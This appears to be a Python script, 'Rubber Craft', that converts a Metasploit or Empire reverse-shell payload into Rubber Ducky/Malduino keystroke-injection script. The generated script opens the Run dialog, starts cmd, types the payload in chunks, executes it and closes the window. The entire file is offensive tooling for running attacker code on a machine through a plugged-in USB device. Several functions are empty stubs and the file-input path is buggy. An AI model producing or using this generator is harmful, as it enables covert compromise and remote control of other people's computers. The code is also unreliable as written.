#!/usr/bin/python3
#
#
# Rubber Craft
# Written by True Demon
# Description: A payload generator program for Rubber Ducky and malduinos
#
__author__ = "True-Demon"

import argparse


class Payload(object):
	def __init__(self, type, string):
		self.type = type
		self.string = string

	# Splits the payload into list of multiple 40 character strings for those long, absurd empire payloads :)
	def splitter(self):
		raw = self.string
		return [raw[i:i+40] for i in range(0, len(raw), 40)] # create a list of 40 character chunks for range of raw

	# Generate payload for Metasploit
	def gen_msf(self):
		pass

	# Generate payload for empire
	def gen_empire(self):
		pass

	def write_to_file(self, outfile):
		pass
	
	def build_final(self):
		split = self.splitter()
		duck_payload = "GUI r\n"
		duck_payload += "DELAY 500\n"
		duck_payload += "STRING cmd\n"
		duck_payload += "ENTER\n"
		for i in split:
			duck_payload += "STRING " + i + "\n"
		duck_payload += "ENTER \n"
		duck_payload += "DELAY 1000\n"
		duck_payload += "CTRL F4"
		return duck_payload

parser = argparse.ArgumentParser()
#parser.add_argument('-p', '--payload', action='store', help='payload to generate for duck script')
#parser.add_argument('--options', action='store', nargs='+', help='payload options')
parser.add_argument('-o', '--output', action='store', help='file path/name to output for payload')
parser.add_argument('-f', '--file', action='store', help='input file from metasploit/empire for payload')
#parser.add_argument('-F', '--format', action='store', choices=['py', 'psh'], help='output as powershell or python')
#parser.add_argument('-t', '--type', action='store', choices=['empire', 'msf'], help='specify payload source')
parser.add_argument('-r', '--raw', action='store', metavar='raw',
					help='paste the raw payload to convert to ducky script')

args = parser.parse_args()

def create_malduino_payload(string=None, infile=None, outfile=None):
	if infile is not None:
		raw = open(infile, 'r')
		payload = Payload('reverse_shell', raw.readlines())
		raw.close()
		
		payload.split = payload.splitter()
		if outfile is not None:
			file = open(outfile, 'w+')
			duck_payload = payload.build_final()
			file.write(duck_payload)
			file.close()
			print("Payload written to ", outfile)
			return 0
		else:
			print("="*8, "PAYLOAD", "="*8)
			print(payload.build_final())
			return 0

	elif string is not None:
		payload = Payload('reverse_shell', string)
		if outfile is not None:
			file = open(outfile, 'w+')
			duck_payload = payload.build_final()
			file.write(duck_payload)
			file.close()
			print("Payload written to ", outfile)
			return 0
		else:
			print("="*8, "PAYLOAD", "="*8)
			print(payload.build_final())
			return 0
	else:
		print("Payload was not defined. Use -r (raw string) or specify -f (--file) for payload input")
		return 0

infile = args.file
outfile = args.output
raw_payload = args.raw

create_malduino_payload(raw_payload, infile, outfile)
